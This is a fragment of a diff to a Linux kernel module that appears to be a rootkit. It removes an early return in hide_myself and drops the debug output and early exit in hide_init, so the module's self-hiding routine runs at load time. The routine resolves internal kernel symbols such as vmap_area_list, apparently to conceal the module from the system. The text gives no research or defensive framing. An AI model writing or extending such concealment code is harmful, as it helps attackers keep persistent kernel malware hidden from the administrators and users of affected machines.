@@ -62,8 +62,6 @@ static void __init hide_myself(void)
     unregister_kprobe(&kp);
 #endif
 	
-   return;
-	
     _vmap_area_list =
         (struct list_head *) kallsyms_lookup_nameX("vmap_area_list");
     _vmap_area_root = (struct rb_root *) kallsyms_lookup_nameX("vmap_area_root");
@@ -419,11 +417,6 @@ static int __init hide_init(void)
 	        return ret;
 	    }       
     }
-
-	printk(KERN_INFO "pvm: sizeof(struct input_dev) = %zu\n", sizeof(struct input_dev));
-    printk(KERN_INFO "pvm: offset: event_lock = %zu\n", offsetof(struct input_dev, event_lock));
-    printk(KERN_INFO "pvm: offset: mt = %zu\n", offsetof(struct input_dev, mt));   // change 'mt' if your kernel uses mt_slots or mt_state
-    return 0;
 
 	hide_myself();
 
